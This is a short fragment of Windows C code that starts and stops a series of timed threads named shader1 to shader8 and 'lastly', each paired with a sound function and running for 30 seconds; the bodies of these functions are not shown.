	TerminateThread(thread4, 0);
	CloseHandle(thread4);
	TerminateThread(thread4dot1, 0);
	CloseHandle(thread4dot1);
	InvalidateRect(0, 0, 0);
	HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
	sound5();
	Sleep(30000);
	TerminateThread(thread5, 0);
	CloseHandle(thread5);
	HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
	sound6();
	Sleep(30000);
	TerminateThread(thread6, 0);
	CloseHandle(thread6);
	HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
	sound7();
	Sleep(30000);
	TerminateThread(thread7, 0);
	CloseHandle(thread7);
	HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
	HANDLE thread8dot1 = CreateThread(0, 0, shader1, 0, 0, 0);
	sound8();
	Sleep(30000);
	TerminateThread(thread8, 0);
	CloseHandle(thread8);
	TerminateThread(thread8dot1, 0);
	CloseHandle(thread8dot1);
	HANDLE thread9 = CreateThread(0, 0, lastly, 0, 0, 0);
	sound9();
	Sleep(30000);
	TerminateThread(thread9, 0);
	CloseHandle(thread9);
}
